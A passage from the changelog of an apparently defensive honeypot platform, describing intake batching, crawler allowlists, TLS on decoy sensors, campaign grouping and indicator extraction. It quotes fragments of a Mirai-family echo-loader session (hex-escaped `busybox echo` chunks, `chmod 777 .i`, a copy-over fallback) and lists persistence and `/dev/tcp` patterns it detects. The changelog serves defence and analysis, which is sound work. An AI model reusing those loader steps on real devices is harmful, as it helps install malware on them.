  and sub-microsecond timestamps, cut into batches of 1 to the whole stream) holds the ledger rows
  with their hashes, `ip_score`, `ip_vantage` and `ip_sensor` byte-identical to one-at-a-time
  ingestion and runs `verify_chain` and `rebuild_projection` on the batch-built ledger. On a 1M-row
  test ledger with a 200k-event source (RAM-backed server): about 350 to 470 events a second one at
  a time, 11,000 to 13,600 in batches of 1000, with the lock held about 70 to 90 ms per batch.
  The runner's read size now adapts to lag: 100 lines when caught up, doubling to 1000 while a log
  keeps filling whole batches, back to 100 on a short or failed batch; the tailer enforces an 8 MiB
  byte budget in the read itself (`LogTailer::read_batch_bounded`), so a burst of near-megabyte
  lines cannot make a batch a gigabyte. A batch that fails is retried in halves when one event
  can be the cause (invalid, a stored projection that will not decode, a data exception such as a
  NUL in metadata, a constraint), so the events before it commit, and intake moves its read
  position past exactly those lines: the next poll starts at the failed line, the committed
  prefix is not appended again (it would otherwise be re-appended as new ledger rows on every
  poll with no pause, inflating the source's event counters toward volume listing), and a failure
  at the first line reports nothing ingested so the loop sleeps. Nothing is skipped or
  quarantined: an event the database refuses on every attempt still holds that sensor's intake at
  its line, now reported as `intake wedged at <sensor>` after three consecutive refusals of the
  same line, quoted by `intake-stalled`. Probe confirmations are recorded only for lines the
  append reached. The console's delist, relist and delete take the append lock, so one landing
  mid-batch is no longer overwritten, and the review queue's population scan skips a delisted
  address. The position after a partial commit is computed from the line lengths recorded at
  read time (`LogTailer::commit_batch_through`), not by reading again: a re-read goes through
  rotation handling, and a `copytruncate` landing during the append returned the new file's
  first lines, which were then marked done unread; now a changed file means the batch is read
  again from its start (replayed, never skipped). The cursor is persisted after a partial
  commit so a restart resumes at the refused line, and a dropped connection between refusals
  no longer resets the three-poll wedge count. A lost commit acknowledgement still replays a
  batch (at-least-once). `append_bench` gains a `batched` mode that also reports how long a second
  writer waits on the lock.

- **Declared crawlers can be kept out of the published feed by address, and the HTTP sensor labels
  a User-Agent that claims to be one** - research and AI crawlers (ClaudeBot, Claude-User,
  Claude-SearchBot, Googlebot, CensysInspect and others) reach the HTTP sensor and were
  published like any other source. `PROPOLIS_FEED_ALLOWLIST_FILE` names a local text file of CIDRs
  (one per line, `#` comments), merged into the existing `PROPOLIS_FEED_ALLOWLIST`, so an operator
  can add a crawler operator's published ranges with no code change. The file is read at startup,
  bounded (1 MiB, 50,000 entries) and all-or-nothing: an unreadable file, a bad line, a bare
  address, an entry wider than /8 (IPv4) or /16 (IPv6), or non-UTF-8 content refuses to start the
  daemon, so a corrupted or truncated list can never exclude everything or silently exclude
  nothing. Nothing is fetched from the network. Separately, an HTTP request whose User-Agent
  contains a known crawler token gets `claimed_crawler` in its event metadata (a fixed label, not
  the header text). The label is display only: a User-Agent is attacker-controlled, so it changes
  no score, queue entry or feed decision, and a ClaudeBot User-Agent from an address that is not in
  the file is scored and published like any other source
  (`crates/core-scoring/src/allowlist.rs#load_allowlist_file`, `crates/sensor-http/src/crawler.rs#claimed_crawler`).

- **Docs: `docs/operations/captured-content-handling.md`** - the operator procedure for a capture
  that may be illegal material (above all CSAM): what the console and spool already do to limit
  exposure (hash-named bodies, no rendering, download forced as an attachment), the rules (never
  open or preview a capture, handle media and archives by hash, keep suspect files out of
  VirusTotal upload and vendor paths), quarantining one sample by moving it out of the spool,
  and the reporting process (US 18 U.S.C. 2258A and the CyberTipline, INHOPE hotlines elsewhere),
  framed as process and not legal advice. It also lists what works against the procedure today
  (automatic VirusTotal upload when opted in, 30-day deletion with no hold, tmpfs spools).

- **`deploy/config-check.sh` compares the configuration with what is running** - five faults on
  the production box were each found by accident: a typo in `PROPOLIS_SENSOR_LOGS`, MQTT's log
  absent from that list, sensor-cred's PostgreSQL listener never producing a log (with 5432 open in
  the firewall; the likely cause, another process holding the port, is exactly what the new check
  names), `logrotate.timer` silently dead, and an
  upgrade whose first run installed no new binary. The check is read-only and prints one row per
  listener (unit, who holds the port, firewall, log age and size against the rotation size, the
  `PROPOLIS_SENSOR_LOGS` entry as the daemon parses it, the newest ledger event) and an exact fix
  line per failure. A firewall-open port held by something that is not the sensor is reported
  first as `DANGEROUS`. Host rows cover the rotation timer and state file, the installed
  binaries against the build and the deploy stamp, `watch.env` against `propolis.env`, and enabled
  sensor units with no bind configured. It works without root and lists what that limited (`?`,
  exit status `1`, never a pass); `--json` prints one document; exit `0` ok, `1` warnings, `2`
  failures. `upgrade.sh` now runs it last with `--report-only`, so it can never fail an upgrade.
  The listener derivation moved into `deploy/listeners-lib.sh`, which `fleet-listeners.sh` now
  sources too, so the fleet inventory and the check share one table (the generated inventory is
  byte-identical). No migration or wire change. See
  [service lifecycle](docs/operations/service-lifecycle.md#configuration-check).
- **Campaigns** - addresses doing the same thing are grouped into one campaign: the same captured
  sample (a worm copying itself), the same normalized command sequence (addresses, ports, markers
  and payload runs replaced, repeats collapsed; the w.sh script, the 45-command survey, Mirai
  loaders), or three sensors reached from one address within an hour. A bounded background
  indexer (`campaigns` subsystem) builds them from the ledger past a cursor, off the append path
  (migration `0015`, no backfill; it reads an existing ledger at about 6,000 events a second after
  the upgrade). New `/campaigns` and `/campaigns/{id}` pages; the review queue, IP and Samples
  pages link to an address's or sample's campaign; `/samples/{sha256}` shows a sample's
  campaigns and indicators. Approving a campaign's pending members is one explicit action that
  lists them first and approves only the listed ones still pending. A sample campaign whose script
  scans for and copies itself to new hosts shows its members as infected hosts on the console; the
  vendor submission wording is unchanged. See `docs/operations/campaigns.md`.
- **Indicators from artifacts and commands** - URLs, `/dev/tcp` endpoints, SSH and PEM key
  fingerprints, crypt-hash markers (never the hash), IRC servers and channels, `/etc/hosts`
  sinkholes, cron, systemd, rc.local, init.d, shell-profile and `chattr +i` persistence with their
  drop paths, and proxy `CONNECT` templates and gateway hosts are extracted from commands, download
  URLs and captured artifacts (binaries through their printable strings), sanitized, capped and
  stored with their provenance. Embedded credentials are recorded only as present, never their
  value. They are shown on the sample and campaign
  pages and are not published to the feed or vendors.
- **Propolis rotates its own sensor logs, and alerts when rotation fails** - the policy in
  `/etc/logrotate.d/propolis-sensors` relied on the distribution's `logrotate.timer`, which was
  inactive for eleven days on the production box; nothing rotated, one telnet log reached 6.6 GB
  and `/var` reached 80% used. `propolis-logrotate.timer` (hourly, persistent) now runs
  `logrotate` on that policy with its own state file, and `install.sh` and `upgrade.sh` install
  and enable it, so a normal upgrade is the rollout. A `prerotate` free-space guard
  (`/usr/local/sbin/propolis-logrotate-guard`) refuses to `copytruncate` a log that does not fit
  on its filesystem, leaving it untouched while the other logs still rotate. Two ops-alert
  conditions: `sensor-log-oversized` (a configured sensor log over three times the rotation size,
  or the log filesystem over 85% used; clears below twice the size and 80%) and `rotation-stale`
  (the rotation state file not rewritten for three hours). The monitor now evaluates fourteen
  conditions. The hand recovery for a log too large to rotate is in
  [retention](docs/operations/retention.md#a-log-too-large-to-rotate). A collector host that
  installs by hand (split deployment) must also install the guard, units and timer; its page lists
  the commands.
- **Console log view keeps fields and folds repeats** - the `/logs` ring now keeps each event's
  structured fields (`statement`, `elapsed`, `reason`, `sensor`, ...), so "slow statement" and
  "submission held" say what was slow and why it was held. Values are capped at 512 bytes, 32
  fields and a 2 KiB message, and the ring is held to 2 MiB charged from allocated capacity as
  well as to its 1000 entries. The view shows fields inline and expands to all of them, folds
  adjacent identical INFO entries from one target into one row with a count and the values each
  field took, and opens filtered to warnings and errors with a count of the rows it hides; the
  live stream folds by the same rule.
- **Attackers pages through every scored address** - `/ips` stopped silently at 500 rows. It now
  pages 500 at a time with a keyset cursor (`?after=` / `?before=`, the address the page
  continues from) and says "showing 501-1,000 of N", exact to 100,000 rows and a labelled
  estimate past that. The score sort orders by a key equal in order to the live score but
  constant over time, so rows clamped at 100 do not trade places between pages. A note above
  the table states the tier rule and why tier and live score can disagree.
- **Review rows say what the address did** - each pending row has a context line: the sensors
  it reached, its session count, its three most frequent signals, and its first upload or
  download, else its first command after the Mirai shell-entry preamble. Counts come from at
  most 5,000 of the address's events and say so when that is not all of them.
- **Recent activity folds a flooding source** - the dashboard reads the newest 1,000 events and
  folds consecutive events with one source, sensor and signal into one row with a count,
  keeping the newest 20 runs, so one source can no longer fill the panel.
- **IP page folds retries and echo-loader chunks** - consecutive sessions from one sensor that
  ran the same commands fold into one card with a count and the usernames tried, and a run of
  echo-loader chunk writes to one file (`assembled_file` / `chunk_index`) is one row,
  "N echo chunks to FILE", with the lines behind an expander.
- **Per-source command-event budget with flood summaries (ssh, telnet, adb)** - a handful of
  Mirai-family echo loaders, each running the same ~53-command session around the clock and
  several at once, made telnet 97% of all events (~15 a second, 2,555 from one address in ten
  minutes), outran log rotation and put intake 6.6 GB behind. The per-connection cap of 256 could
  not see it. Each of the three sensors now holds a token bucket per source network (/24 or /56)
  charged by `honeypot_command_exec` events only (`CommandEventGate` in
  `sensor_framework::command_flood`, reached through `ConnectionBudget::with_command_gate`):
  burst 200, then 12 a minute, set by `PROPOLIS_<SSH|TELNET|ADB>_COMMAND_EVENT_RATE_PER_MIN` and
  `_BURST` (a positive integer; zero or garbage exits 1; `Rate::per_minute` is new in
  `sensor_framework::rate_limit`). Past it, a command event is not written but counted into one
  `honeypot_command_exec` per network per 60 s window with `command_summary: true`,
  `suppressed_count`, `distinct_commands` (shapes), up to 8 samples, first and last seen,
  `session_count` and, for echo-loader chunks, `assembled_file` and `max_chunk_index`; it is
  written when the window ends and at shutdown. Never summarized: logins, connections, downloads
  and derived URLs, every capture upload, the per-session flood markers, the first command of each
  shape per network per window (`command_shape` takes out `\xNN`/`\NNN` escape runs, hex runs of
  16+ and base64-looking runs of 24+, so the observed 53-line session is 16 shapes whatever its
  marker), and each address's first command event per window (scoring is per address). An
  echo-loader chunk (a command event with `assembled_file`) is never a first: its bytes are in the
  capture. Replies are unchanged: only logging is summarized. The summary scores as one command
  event; the merit path is unaffected (60 s dedup), the volume path reaches its threshold later.
  The observed loop, four parallel sessions every 30 s for ten minutes, drops from 4,240 command
  events to 407 plus 10 summaries. Additive metadata: no migration or wire version change.
- **Intake lag is visible and pages** - each intake poll records how many bytes of its log are
  unread (`LogTailer::backlog_bytes`: the file past the read offset plus any rotated-out file
  still being drained) and the `observed_at` of the last event it appended. `/metrics` publishes
  `propolis_intake_bytes_behind{sensor}` and `propolis_intake_oldest_unread_age_seconds{sensor}`,
  labelled with the `PROPOLIS_SENSOR_LOGS` name; the age is 0 when the poll read every complete
  line and absent when lines wait but nothing has been appended since start, and a process that
  tails nothing publishes neither. A new ops-alert condition, `intake-lagging`, pages when lines
  have waited past max(10 min, 3 intake polls) for 10 minutes, or when the unread bytes rose at
  three consecutive monitor polls that each found complete lines waiting; it clears when the log
  is drained, or after three polls without growth once the wait is back under the threshold, and
  never fires on an idle log. The fleet pane shows `behind: <bytes> / <age>` under LAST EVENT on
  the listener rows of a log over the age threshold. No append-latency histogram: `/metrics` has
  no histogram support. See `docs/operations/health-and-observability.md` and
  `docs/troubleshooting/intake-backlog.md`.
- **Echo-loader uploads are reassembled and captured** - a Mirai/Mozi telnet loader with no
  usable `wget` uploads its downloader as some forty `busybox echo -ne '\xNN...' >> .i` lines,
  runs `chmod 777 .i` and `./.i a b c d port`. Each line was logged but the file was never
  captured, and the loader retried the whole session every few minutes. The shared shell (SSH,
  telnet, ADB) now notes every file built from `echo`/`printf` output, chunk by chunk, and
  captures it as one `honeypot_malware_upload` with `capture_reason` `echo_loader`,
  `chunk_count` and `destination`, once the line that makes it executable or runs it has run, or
  at the session's end for an assembly of two or more chunks never run. It goes through the
  per-session stdin capture set (`StdinCaptures::record_assembled`; sensors pass it with
  `FakeShell::with_captures` and report the ending with `StdinCaptures::end_session`), so one body
  is one sample per session and the memory budget applies; a file is recognized by content, so
  the loader's `cp /bin/ls .j && cat .i>.j && rm .i && cp .j .i` fallback is the same sample.
  Each chunk's command event carries `assembled_file` and `chunk_index`. Running an assembled ELF
  that holds a `GET <path> HTTP/1.x` request line with four octets and a port as arguments
  executes nothing, answers as a downloader that cannot reach its server (no output, status 1),
  and emits the stage-2 URL as a `honeypot_file_download` with `derived_from` `echo_loader_args`
  and `derived_sha256`, which the review fetcher vets like any URL; the sensor makes no
  connection. Additive metadata: no migration or wire version change.
- **`propolis-watch`, a read-only live view of the sensors** - new crate `watch`, binary
  `propolis-watch`. It streams every event log named in `PROPOLIS_SENSOR_LOGS` as JSON Lines on
  stdout: a `start` record with the resolved sources, one `event` record per log line (the
  sensor's JSON embedded byte for byte, or `raw` text when a line is not a JSON object), a
  `dropped` record in place of each line over the 1 MiB cap, and a `heartbeat` every 10 s giving
  each log's status (`following`, `missing` or `unreadable`), size and lines seen, so a quiet
  node is distinguishable from a dead stream and a mistyped log path shows on the first
  heartbeat. It starts at the end of each log by default (`--since-start` replays the current
  file), follows `copytruncate` rotation, filters with `--sensor`, `--signal` and
  `--source-ip`, and with `--journal` adds the `sensor-*` and `propolis` units' journal from a
  `journalctl` child with a fixed argument vector. It writes no file, opens no socket and needs
  no database or credential; a static test holds its source to that. Arguments also come from
  `SSH_ORIGINAL_COMMAND`, split on whitespace only through the same allowlist, so it can run as
  an SSH forced command: `deploy/provision.sh` now creates a `propolis-watch` login account
  (home `/var/lib/propolis-watch`, shell `/bin/sh`, password field `*`, read-only membership in
  every sensor group, no journal access unless added by hand), with its home, `.ssh` and
  `authorized_keys` owned by root so the account cannot add a key to itself; `install.sh` and
  `upgrade.sh` install the binary; and `deploy/watch-authorized-keys.example` shows the
  `restrict`ed forced-command key line, `command="/usr/local/bin/propolis-watch"`. When
  `PROPOLIS_SENSOR_LOGS` is not in its environment the watcher reads that one key from
  `/etc/propolis/watch.env`, which the new `deploy/watch-env.sh` derives from `propolis.env` on
  every provision (so every install and upgrade), copying only that line, root:propolis-watch
  0640, atomically; the start record and heartbeat say which source the list came from. No key
  is generated or installed. See `docs/operations/live-watch.md`.
- **`log-tailer` gains a cursorless mode and owns the sensor-log list parser** -
  `LogTailer::without_cursor` reads and follows rotation like the cursor-backed tailer but has
  no cursor to load or save, and `read_batch_entries` reports each over-length discard in place.
  `parse_sensor_logs` replaces the three copies of the `name:path` grammar in `propolis`,
  `intake` and `shipper`; their behavior and error messages are unchanged.
- **Every event records the port it arrived on** - the sensor framework stamps
  `metadata.local_port` (an integer: the accepted TCP socket's local port, or the bound UDP
  socket's port) on every event every sensor emits, uploads and the DNS and TFTP rate-limit
  summaries included, without any sensor building the key. The transport stays in `protocol`.
  Additive metadata: no migration, no wire or schema version change, and the hash chain is
  unaffected. Each sensor crate gains a `tests/arrival.rs` that checks it against its real
  listeners, and a coverage test fails for a sensor crate without one.
- **`sensor-tftp` rate limits its request socket and refuses reflector and unroutable
  sources** - the byte budget already kept every reply no larger than what the peer sent, but a
  spoofed request flood still drew one ERROR per request at line rate toward the forged source,
  and one event per request in the log. Every datagram on the request socket, malformed ones
  included, now takes a token from its source network's bucket (IPv4 /24, IPv6 /56: 5 per
  second, burst 10) and a global one (1000 per second, burst 2000), the same `ReplyRateLimiter`
  and defaults as `sensor-dns`, set by `PROPOLIS_TFTP_REPLY_RATE_PER_SOURCE`,
  `PROPOLIS_TFTP_REPLY_BURST_PER_SOURCE`, `PROPOLIS_TFTP_REPLY_RATE_GLOBAL` and
  `PROPOLIS_TFTP_REPLY_BURST_GLOBAL` (positive integers; zero or garbage refuses to start). A
  datagram over the limit gets no reply and no event of its own; each source network gets one
  `query_status` `rate_limited` summary event per 10 s, the same event `sensor-dns` writes, with
  samples of `"<rrq|wrq> <filename>"` or `malformed`, and shutdown writes the summaries still
  accumulating. The packets of a running transfer arrive on its own socket and are not charged.
  A request from source port 0, 7, 13, 17, 19 or 37, or from an unspecified, broadcast or
  multicast address, now gets no transfer socket and no packet at all, not even the first ERROR
  or ACK 0; its probe event carries `suppress_reason` (`reflective_source_port` or
  `unroutable_source`). The transfer's send re-checks the same rule. The check
  (`check_reply_source`) and the summary event (`rate_limited_event`) moved into
  `sensor-framework`, and `sensor-dns` now uses the same implementations; its behavior is
  unchanged. `start_test_server` and `start_test_server_with_capture_budget` (formerly
  `start_test_server_with_handoff`) take the rate configuration and return a `TftpServer`.
- **DNS honeypot sensor (default off)** - new crate and binary `sensor-dns`. `PROPOLIS_DNS_BIND`
  serves DNS over UDP and TCP on the same address (conventionally 53); if either transport cannot
  bind, the sensor exits 1 with nothing left listening. `PROPOLIS_DNS_TLS_BIND` adds DNS over TLS
  (conventionally 853) with `PROPOLIS_DNS_TLS_CERT` and `PROPOLIS_DNS_TLS_KEY`, under the same
  fail-closed rules as the other TLS sensors. It serves no records: every query that parses gets
  REFUSED, the query's header rewritten (ID kept, RD and CD copied) and its first question echoed,
  nothing appended, so a UDP reply is never larger than its query; the crate's one UDP `send_to`
  re-checks that with a byte budget and refuses unspecified, broadcast and multicast sources and
  the source ports 0, 7, 13, 17, 19 and 37 (recorded as `suppressed`). A message with QR set, a
  non-zero opcode (NOTIFY, UPDATE), QDCOUNT other than 1, a compression pointer or bad label in
  the question, a name over 255 bytes, a truncated question, or an answer or authority record
  (except exactly one SOA authority record on an IXFR over TCP; an unparseable one is
  `malformed_authority`) is recorded as `rejected` and gets no reply; on TCP and DoT it also
  closes the connection, as does a length prefix under 12 or over 4096, a message that would pass
  `PROPOLIS_DNS_MAX_CAPTURED_BYTES` (`byte_cap`; default 262272, 64 maximum-size queries with
  their 2-byte prefixes), and a body cut short or not arriving within the read timeout
  (`truncated_body`, `body_timeout`), each recorded with its `declared_len`. A connection carries
  at most 64 queries, and a reply must be written within the read timeout. UDP replies are rate
  limited per source network (IPv4 /24, IPv6 /56: 5 per second, burst 10) and in total (1000 per
  second, burst 2000), set by `PROPOLIS_DNS_REPLY_RATE_PER_SOURCE`,
  `PROPOLIS_DNS_REPLY_BURST_PER_SOURCE`, `PROPOLIS_DNS_REPLY_RATE_GLOBAL` and
  `PROPOLIS_DNS_REPLY_BURST_GLOBAL` (positive integers; zero refuses to start). A datagram over
  the limit gets no reply and no event of its own; each source network gets one
  `query_status` `rate_limited` summary event per 10 s with counts, bytes, first and last seen
  and up to 8 sample questions, so a flood cannot become a log flood. The limiter
  (`ReplyRateLimiter`, `FloodLedger`) lives in `sensor-framework` with fixed-size tables. A UDP
  query is a `honeypot_connection` over `udp`; a TCP or DoT connection is one
  `honeypot_connection` plus one `honeypot_command_exec` per message, with `command`
  `"<QTYPE> <qname>"`, or `malformed` for a message whose question did not parse. Metadata
  records the header, the question (qname in escaped presentation form, sanitized), the EDNS
  buffer size, DO bit and option codes (never option data), and `probe_signals`:
  `amplification_probe`, `open_resolver_probe` (RD with class IN or ANY), `zone_transfer_probe`,
  `chaos_fingerprint_probe`. DoT events carry `"tls": true`. A bind failure names the transport
  (`udp`, `tcp`, `dot`) and the address. The unit
  `deploy/sensor-dns.service` grants `CAP_NET_BIND_SERVICE` and
  `ReadOnlyPaths=-/etc/propolis/tls`; `provision.sh` creates `propolis-dns` and its log
  directory, `provision-tls.sh` mints a `dns` pair, and the fleet inventory derives
  `dns/udp/<port>` and `dns/tcp/<port>` from the one bind plus `dns/tcp/<port>` from the TLS
  bind. Known fingerprint costs: no OPT record is returned even when the query carried one, and
  a denied zone transfer gets REFUSED, which some real servers answer with NOTAUTH.
- **`sensor-cred` PostgreSQL answers a GSSENCRequest with `N`** - libpq sends a GSSENCRequest
  (code 80877104) before anything else when built with GSSAPI, and a real server without GSS
  encryption answers one `N` byte and keeps reading. The sensor did not handle it, so such a client
  never reached the StartupMessage and its credentials were not captured. It now answers `N`, with
  or without a TLS pair, and continues with the client's SSLRequest (answered `S` over TLS when
  configured, tagged `"tls": true`) or plain StartupMessage. As in PostgreSQL, each negotiation
  request is honoured once per connection and none inside TLS, so at most two precede the
  StartupMessage and a repeated one closes the connection. A repeated SSLRequest on a plaintext
  connection used to be read as a malformed StartupMessage; it now closes the connection too.
- **In-band TLS on `sensor-cred` (default off)** - `PROPOLIS_CRED_TLS_CERT` and
  `PROPOLIS_CRED_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) enable TLS on the
  existing PostgreSQL, MySQL, MSSQL and MongoDB ports. There is no TLS bind and no new port, so
  the fleet inventory is unchanged; VNC is unchanged. PostgreSQL answers an SSLRequest `S` (until
  now always `N`) and continues over TLS; a second SSLRequest inside TLS closes the connection and
  plaintext sent after the `S` fails the handshake. MySQL advertises `CLIENT_SSL` and switches to
  TLS on a client SSLRequest, answering the HandshakeResponse with OK at sequence id 3. MSSQL runs
  the handshake inside TDS PRELOGIN packets, then Login7 and LOGINACK as raw TLS records, with TLS
  1.3 session tickets off for MSSQL only: a client offering `ENCRYPT_ON` or `ENCRYPT_REQ` is
  answered `ENCRYPT_ON` and gets TLS, a client offering `ENCRYPT_OFF` gets the pre-TLS PRELOGIN
  response byte for byte and a plaintext session (a real server would answer `ENCRYPT_REQ`; the
  honeypot keeps the credentials of scanners that cannot do TLS; for the same reason a client
  that asked for encryption but then sends a plaintext Login7 is captured in plaintext), and
  `ENCRYPT_NOT_SUP` or no option gets `ENCRYPT_NOT_SUP` and plaintext. MongoDB peeks the first two
  bytes and serves `0x16 0x03` (a TLS record header) over TLS on the plaintext port, so a
  plaintext first message whose length's low byte is `0x16` is no longer mistaken for TLS; its
  connection event is written before the handshake, so a failed handshake is still recorded.
  Plaintext clients keep working on every port. Events from a TLS session carry `"tls": true`
  (for PostgreSQL, MySQL and MSSQL the pre-negotiation connection event stays untagged). The
  startup line names only the TLS-capable protocols that are bound. Fail-closed: when either variable is set (a
  blank value counts as unset), exactly one set, a non-UTF-8 value, or an unusable pair makes the
  sensor exit 1 before binding anything. A bind failure on one protocol is still logged and skipped. The unit gains
  `ReadOnlyPaths=-/etc/propolis/tls`. The MSSQL TDS-TLS adapter is validated against a rustls
  client and the MS-TDS text only; the owner smoke tests against real drivers are listed in
  `docs/operations/networking-tls.md`.
- **FTPS and AUTH TLS on `sensor-ftp` (default off)** - `PROPOLIS_FTP_TLS_CERT` and
  `PROPOLIS_FTP_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) enable AUTH TLS on
  the plain listener, which until now answered `500`. One optional listener in the same process,
  writing the same event log and sharing the capture hand-off and memory budget, exists only when
  its bind is set (no compiled default): `PROPOLIS_FTP_TLS_BIND` (deploy convention
  `0.0.0.0:990`, implicit TLS, requires the pair). `AUTH TLS`, `TLS-C`, `SSL` and `TLS-P` answer
  `234` and upgrade, other AUTH types get `504`, AUTH inside TLS gets `503`. Plaintext pipelined
  behind AUTH TLS is refused before any `234` with one `honeypot_command_exec` event
  (`starttls_refused: pipelined_plaintext`, the byte count, never the bytes), a
  `504 Pipelined commands after AUTH TLS refused.` and a close. The upgrade resets the session as
  REIN would (user, login, PBSZ, PROT, passive listener) and keeps the captured-byte count.
  PBSZ is accepted inside TLS only (`200 PBSZ set to 0.`), PROT takes `C` and `P` after PBSZ
  (`S` and `E` get `536`), FEAT lists AUTH, PBSZ and PROT only when TLS is configured, and with no
  pair set AUTH, PBSZ and PROT still answer `500`. After `PROT P` the passive data socket is
  wrapped in TLS once the data peer passed the source-IP check (handshake bounded by the read
  timeout, a failure gets `425`), STOR over it is spooled exactly like plaintext, and a data close
  without `close_notify` counts as end of file. Connection, login and upload events from a session
  whose control channel is TLS carry `"tls": true`; plain events are unchanged. QUIT now shuts the
  stream down after `221`. Fail-closed: exactly one of cert and key, a TLS bind without both, an
  invalid bind, or an unusable pair makes the sensor exit 1 before binding anything, and a bind
  failure on any listener stops the others and exits 1. Cert and key without a TLS bind enable
  AUTH TLS and open no 990 listener. `fleet-listeners.sh` derives an `ftp` tcp listener from
  `PROPOLIS_FTP_TLS_BIND`, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
- **SMTPS, SMTP submission and STARTTLS on `sensor-smtp` (default off)** - `PROPOLIS_SMTP_TLS_CERT`
  and `PROPOLIS_SMTP_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) turn STARTTLS
  from the old `454` reply into a real upgrade on the plain listeners. Two optional listeners in
  the same process, writing the same event log, exist only when their bind is set (no compiled
  default): `PROPOLIS_SMTP_SUBMISSION_BIND` (deploy convention `0.0.0.0:587`, plain with
  STARTTLS) and `PROPOLIS_SMTP_TLS_BIND` (`0.0.0.0:465`, implicit TLS, requires the pair).
  STARTTLS replies `220 2.0.0 Ready to start TLS`, refuses plaintext pipelined behind it with
  one `honeypot_command_exec` event (`starttls_refused: pipelined_plaintext`, the byte count,
  never the bytes) and a `554` before any handshake, forces a fresh EHLO and resets MAIL, RCPT
  and BDAT state after the upgrade, answers a second STARTTLS inside TLS with `503`, and answers
  STARTTLS with parameters with `501` (only when TLS is configured). EHLO inside TLS omits
  STARTTLS. Connection, login and data events from a TLS session carry `"tls": true`; plain
  events are unchanged, and with no TLS variable set the sensor is byte-identical (STARTTLS
  advertised, `454`). Fail-closed: exactly one of cert and key, a TLS bind without both, an
  invalid bind, or an unusable pair makes the sensor exit 1 before binding anything, and a bind
  failure on any listener stops the others and exits 1. Cert and key without a TLS bind enable
  STARTTLS and open no 465 listener. `fleet-listeners.sh` derives an `smtp` tcp listener from
  each of the two new bind variables, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
- **MQTTS on `sensor-mqtt` (default off)** - a second, implicit-TLS listener in the same process,
  serving the same persona into the same event log, enabled by `PROPOLIS_MQTT_TLS_BIND` (no
  compiled default; the deploy convention is `0.0.0.0:8883`) together with
  `PROPOLIS_MQTT_TLS_CERT` and `PROPOLIS_MQTT_TLS_KEY` (the pair `provision-tls.sh` mints, key
  mode `0600`). MQTT 3.1, 3.1.1 and 5.0 work over it, there is no STARTTLS, and binary-PUBLISH
  spooling, the capture memory budget and the shutdown drain are shared with the plain listener.
  Events from a TLS session (connection, login, command, malformed first packet, malware upload,
  session end) carry `"tls": true`; plain events are unchanged. A failed or stalled handshake is
  dropped with no event and cut at the read timeout. Fail-closed: exactly one of cert and key, a
  TLS bind without both, an invalid bind, or an unusable pair makes the sensor exit 1 before
  binding anything. Cert and key without a TLS bind load and validate the pair, start no TLS
  listener and log one warning, so a TLS listener never opens implicitly. Every session now ends
  with a stream shutdown (`close_notify` on TLS, a FIN on a plain connection). `fleet-listeners.sh`
  derives an `mqtt` tcp listener from `PROPOLIS_MQTT_TLS_BIND`, and the unit gains
  `ReadOnlyPaths=-/etc/propolis/tls`.
- **Redis over TLS on `sensor-redis` (default off)** - a second, implicit-TLS (`rediss://`)
  listener in the same process, serving the same persona into the same event log, enabled by
  `PROPOLIS_REDIS_TLS_BIND` (no compiled default; the deploy convention is `0.0.0.0:6380`)
  together with `PROPOLIS_REDIS_TLS_CERT` and `PROPOLIS_REDIS_TLS_KEY` (the pair
  `provision-tls.sh` mints, key mode `0600`). There is no STARTTLS. Events from a TLS session
  (connection, login, command) carry `"tls": true`; plain events are unchanged, and the AUTH
  password is never captured. A failed or stalled handshake is dropped with no event and cut at
  the read timeout. Fail-closed: exactly one of cert and key, a TLS bind without both, an invalid
  bind, or an unusable pair makes the sensor exit 1 before binding anything. Cert and key without
  a TLS bind load and validate the pair, start no TLS listener and log one warning, so a TLS
  listener never opens implicitly. `fleet-listeners.sh` derives a `redis` tcp listener from
  `PROPOLIS_REDIS_TLS_BIND`, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
- **HTTPS on `sensor-http` (default off)** - a second, implicit-TLS listener in the same process,
  serving the same nginx persona into the same event log, enabled by `PROPOLIS_HTTP_TLS_BIND`
  (no compiled default; the deploy convention is `0.0.0.0:443`) together with
  `PROPOLIS_HTTP_TLS_CERT` and `PROPOLIS_HTTP_TLS_KEY` (the pair `provision-tls.sh` mints, key
  mode `0600`). Events from a TLS session carry `"tls": true`; plain events are unchanged. A
  failed or stalled handshake is dropped with no event and cut at the read timeout. Fail-closed:
  exactly one of cert and key, a TLS bind without both, an invalid bind, or an unusable pair makes
  the sensor exit 1 before binding anything. Cert and key without a TLS bind load and validate the
  pair, start no TLS listener and log one warning, so a TLS listener never opens implicitly.
  `fleet-listeners.sh` derives an `http` tcp listener from `PROPOLIS_HTTP_TLS_BIND`, and the unit
  gains `ReadOnlyPaths=-/etc/propolis/tls`.
- **Sensor TLS foundation** - `sensor-framework` gains
  a `tls` module: a fail-closed loader for a per-sensor certificate and key (a missing, oversized,
  non-regular, malformed or mismatched file, or a key readable by group or other, is an error and
  never a fallback), an implicit-TLS listener that reuses the plain TCP listener's connection
  bounds and cuts the handshake at the read timeout, and a plaintext-to-TLS stream type for
  STARTTLS-style upgrades. No client certificates are requested. `provision-certs` gains
  `--sensor-tls <out-dir> <sensor>...`, which mints one self-signed pair per sensor and keeps a
  pair that already exists. New `deploy/provision-tls.sh`, run by `install.sh` and `upgrade.sh`
  after the binaries are installed, mints the pairs into `/etc/propolis/tls`
  (`0711` root-owned, created by `provision.sh`; keys `0600`, certificates `0644`, both owned by
  the sensor's user); a real certificate placed at those paths survives re-runs. A minted pair is
  used only once its sensor's TLS variables are set (the six entries above).
- **MQTT binary PUBLISH payloads are now spooled** - `sensor-mqtt` still records every PUBLISH as
  metadata, and now also hands a payload that passes the shared `looks_binary` gate to the framework
  capture hand-off, emitting a `honeypot_malware_upload` event (`capture_reason`
  `binary_publish_payload`). Text payloads stay metadata-only. New `PROPOLIS_MQTT_SPOOL_DIR`
  (default `/var/spool/propolis/mqtt`), `PROPOLIS_MQTT_OUTBOX_DIR` and
  `PROPOLIS_MQTT_CAPTURE_MEMORY_BYTES` variables; the unit grants the spool in `ReadWritePaths`,
  `provision.sh` creates it, and the review spool walk (`BODY_SPOOLERS`) now includes `mqtt`.
  Operators with an existing install should back `/var/spool/propolis/mqtt` with a
  noexec,nosuid,nodev mount like the other spools.
- **MQTT 5.0 on `sensor-mqtt`, and a session summary** - the sensor first declined a 5.0 CONNECT
